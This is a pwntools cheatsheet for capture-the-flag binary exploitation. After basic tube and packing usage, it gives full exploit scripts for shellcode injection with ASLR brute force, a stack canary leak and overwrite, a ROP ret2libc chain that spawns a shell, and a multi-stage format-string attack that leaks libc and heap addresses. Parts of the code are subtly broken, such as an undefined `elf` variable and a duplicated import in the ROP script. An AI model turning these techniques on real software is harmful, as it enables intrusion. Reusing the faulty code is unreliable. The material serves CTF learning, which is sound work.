# pwntools cheatsheet

## Installation

```
pip install pwntools
```

## Setup

```python
from pwn import *
BINARY_PATH = './challenge_elf'
binary = ELF(BINARY_PATH)

context.binary = binary
```

`context` stores a global configuration used by some pwntools functions. `context.binary = binary` automatically sets :

- The architecture (x86, amd64, ...)
- The endianness
- The bit-width (32 or 64 bits)

## Tubes

### Local binary

```python
with process(BINARY_PATH) as p:
    # use p to interact with the binary
```

With arguments or environment variables:

```python
with process([BINARY_PATH, arg1, arg2], env={"env_variable1":"value1", "env_variable2": "value2"}) as p:
    # use p to interact with the binary
```

### Local binary with gdb

```python
with gdb.debug(BINARY_PATH) as p:
    # use p to interact with the binary
```

With ASLR disabled:

```python
with gdb.debug(BINARY_PATH, aslr=False) as p:
    # use p to interact with the binary
```

You can pass some commands to gdb::

```python
with gdb.debug(BINARY_PATH, "b main\nc") as p:
    # use p to interact with the binary
```

It is also possible to attach gdb to a running process:

```python
with process(BINARY_PATH) as p:
    gdb.attach(p)
    # use p to interact with the binary
```

### Remote through TCP

```python
with remote('challenge.ctf.com', 1337) as p:
    # use p to interact with the binary
```

### Tubes output

```python
output = p.recv(NUMBER_OF_BYTES)
```

- Gets NUMBER_OF_BYTES bytes.
- Returns immediately if there is some data available.
- Only blocks if there is no data available.

---

```python
output = p.recvline()
```

Gets a line

---

```python
output = p.recvline(keepends=False)
```

Gets a line without the newline character

---

```python
output = p.recvuntil(STRING, drop=True)
```

- Gets data until a specific string is found
- `drop` decides if the string is included in the output or not

---

```python
p.stream()
```
- Prints all the data received from the tube
- Blocks until EOF

### Tubes input

```python
p.send(b"some text")
```

```python
p.sendline(b"some text")
```

### Interactive

```python
p.interactive()
```
- Prints all the data received from the tube
- You can type text and it will be sent to the tube
- Blocks until EOF

## Packing and unpacking

Converts an integer to its byte representation and vice-versa, with respect to endianness and bit-width defined in `context`.

```python
packed_data = pack(0xff1111)
# if context is 32 bits little endian, packed_data is b'\x11\x11\xff\x00'
```

```python
value = unpack(b'\x11\x11\xff\x00')
# if context is 32 bits little endian, value is 0xff1111
```

## Script examples

### Shellcode, aslr brute force


```python
from pwn import *

BINARY_PATH = "./chall4"
binary = ELF(BINARY_PATH)
context.binary = binary

payload = (
    b"A" * 0x40c
    + pack(0xffbd98c0) # addr de retour
    + asm("nop") * 100000
    + asm(shellcraft.i386.linux.sh())
)


while True:
    with process([BINARY_PATH, payload]) as pipe:
        pipe.sendline(b"ls")
        pipe.stream()
```

### Stack buffer overflow and canary


```python
from pwn import *

BINARY_PATH = "./chall5"
binary = ELF(BINARY_PATH)
context.binary = binary

with process([BINARY_PATH]) as pipe:
    # on fait du remplissage jusqu'à écraser le premier byte du canary
    pipe.sendline(b">>>".rjust(0x204 - 0xc + 1))

    # on récupère le canary
    pipe.recvuntil(b">>>")
    canary = b"\x00" + pipe.recv(3)

    # on écrase la stack frame
    pipe.sendline(
        b"A" * 0x3ec
        + pack(0xdeadbeef)  # canary bonus
        + canary
        + b"A" * 0xc
        + pack(binary.symbols["win"])
    )

    pipe.interactive()
```

### ROP

```python
from pwn import *

from pwn import *

BINARY_PATH = './challenge_elf'
binary = ELF(BINARY_PATH)

context.binary = binary

libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.33.so")

with process(BINARY_PATH) as pipe:
    fill_up_buffer = "a" * 128 + "b" * 8

    #################
    # leak libc address
    #################
    pipe.sendline("1234")

    rop = ROP(elf)
    rop.raw(fill_up_buffer)
    rop.puts(elf.got["printf"])
    rop.call(elf.entry)
    print(rop.dump())

    pipe.sendline(rop.chain())
    pipe.recvuntil("feedback.\n")

    packed_printf_address = pipe.recvline(keepends=False)
    printf_address = unpack(packed_printf_address.ljust(8, b"\x00"))
    libc.address = printf_address - libc.symbols["printf"]

    #################
    # get a shell
    #################

    pipe.sendline("1234")
    rop = ROP(libc)
    rop.raw(fill_up_buffer)
    rop.system(next(libc.search(b'/bin/sh')))
    print(rop.dump())

    pipe.sendline(rop.chain())

    pipe.interactive()
```

### Format string

```python
from pwn import *

EXECUTABLE_PATH = "./saveme"

executable = ELF(EXECUTABLE_PATH)
context.binary = executable


# Automatically find format string offset
def send_payload(payload):
    with process(EXECUTABLE_PATH) as target_pipe:
        target_pipe.sendline(b"2")
        target_pipe.sendline(payload)
        target_pipe.recvuntil(b"next person: ")
        return target_pipe.recv()

format_string_helper = FmtStr(send_payload)


MAIN_ADDRESS = 0x004013f4
SCANF_FOR_VULNERABLE_PRINTF_ADDRESS = 0x004014f9
VULNERABLE_PRINTF_ADDRESS = 0x0040151d
LEAVE_MAIN_ADDRESS = 0x00401550

gdb_script = f"""
b *{VULNERABLE_PRINTF_ADDRESS}
c
"""
# with gdb.debug(EXECUTABLE_PATH, gdb_script, aslr=True) as target_pipe:
with process(EXECUTABLE_PATH) as target_pipe:
# with remote("challs.ctf.sekai.team", 4001) as target_pipe:
    # ----------------------------------------------------------------------------------------------
    # Get leaked stack address
    target_pipe.recvuntil(b"gift: ")
    leaked_stack_address_bytes = target_pipe.recvuntil(b" ", drop=True)
    leaked_stack_address = int(leaked_stack_address_bytes, 0)

    # ----------------------------------------------------------------------------------------------
    # - Get libc address
    # - Set printf return address back to scanf
    printf_stack_return_address = leaked_stack_address - 0x18
    target_pipe.sendline(b"2")

    scanf_size = 0x50
    addresses_offset = 0x30

    read_libc_pointer_format_string = b">>>%21$p<<<"
    write_return_address_format_string, write_locations = fmtstr_split(
        offset=format_string_helper.offset + addresses_offset // 8,
        writes={printf_stack_return_address: SCANF_FOR_VULNERABLE_PRINTF_ADDRESS},
    )

    format_string = write_return_address_format_string + read_libc_pointer_format_string
    payload = format_string \
              + b"A" * (addresses_offset - len(format_string)) \
              + write_locations

    target_pipe.sendline(payload)

    print(payload)

    target_pipe.recvuntil(b">>>")
    libc_pointer_value_bytes = target_pipe.recvuntil(b"<<<", drop=True)
    libc_pointer_value = int(libc_pointer_value_bytes, 0)
    libc_address = libc_pointer_value - 0x240b3

    # ----------------------------------------------------------------------------------------------
    # - Get heap address
    # - Set printf return address back to scanf
    heap_pointer_address = libc_address + 0x1ec2c8

    read_heap_pointer_format_string = f">>>%{format_string_helper.offset + addresses_offset // 8 + 3}$s<<<".encode()

    format_string = write_return_address_format_string + read_heap_pointer_format_string
    payload = format_string \
              + b"A" * (addresses_offset - len(format_string)) \
              + write_locations \
              + pack(heap_pointer_address + 1)  # The least significant byte of the pointer has value 0

    target_pipe.sendline(payload)

    target_pipe.recvuntil(b">>>")
    received_heap_pointer_bytes = target_pipe.recvuntil(b"<<<", drop=True)
    heap_pointer_bytes = (b"\x00" + received_heap_pointer_bytes).ljust(8, b"\x00")
    heap_address = unpack(heap_pointer_bytes)

    # ----------------------------------------------------------------------------------------------
    # Get flag
    flag_address = heap_address + 0x2a0

    print_flag_format_string = f">>>%{format_string_helper.offset + addresses_offset // 8}$s<<<".encode()
    payload = print_flag_format_string \
              + b"A" * (addresses_offset - len(print_flag_format_string)) \
              + pack(flag_address)

    target_pipe.sendline(payload)
    target_pipe.recvuntil(b">>>")
    flag = target_pipe.recvuntil(b"<<<", drop=True)

    print(flag)
```